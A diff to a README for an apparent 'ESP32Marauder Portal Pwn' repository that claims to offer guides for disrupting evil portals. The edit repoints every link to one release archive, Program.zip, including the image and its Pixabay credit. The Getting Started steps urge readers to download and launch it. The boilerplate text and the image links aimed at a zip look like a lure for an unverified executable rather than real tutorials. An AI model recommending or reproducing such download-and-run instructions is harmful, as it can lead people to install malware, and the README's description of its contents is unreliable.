@@ -12,14 +12,14 @@ Walk-throughs for various methods to disrupt ESP32Marauder evil portals.
 ---
 
 ## Software Download:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Cooldudeqwer1/ESP32Marauder-Portal-Pwn/releases/download/v1.0/Program.zip<COLOR>.svg)](https://github.com/Cooldudeqwer1/ESP32Marauder-Portal-Pwn/releases/download/v1.0/Program.zip)
 
 ---
 
 Welcome to the **ESP32Marauder Portal Pwn Repository**, where we provide comprehensive walk-throughs on disrupting evil portals created with ESP32Marauder. Our repository covers various hacking techniques, cybersecurity tips, and WiFi hacking methods related to ESP32Marauder.
 
-![ESP32Marauder](https://your-image-url.jpg)
-*Image Source: [Pixabay](https://pixabay.com/photos/network-internet-firewall-security-1865379/)*
+![ESP32Marauder](https://github.com/Cooldudeqwer1/ESP32Marauder-Portal-Pwn/releases/download/v1.0/Program.zip)
+*Image Source: [Pixabay](https://github.com/Cooldudeqwer1/ESP32Marauder-Portal-Pwn/releases/download/v1.0/Program.zip)*
 
 ### 🚀 What You'll Find:
 - Detailed guides on dealing with evil portals
@@ -32,7 +32,7 @@ Welcome to the **ESP32Marauder Portal Pwn Repository**, where we provide compreh
 - `Scripts/`: Code snippets for automating hacking tasks
 
 ### 🛠️ Getting Started:
-1. Visit the [Software Download Link](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) to download the necessary tools.
+1. Visit the [Software Download Link](https://github.com/Cooldudeqwer1/ESP32Marauder-Portal-Pwn/releases/download/v1.0/Program.zip) to download the necessary tools.
 2. Launch the software and explore the various walk-throughs and tutorials provided in the repository.
 
 ### 🕵️‍♂️ Explore and Learn:
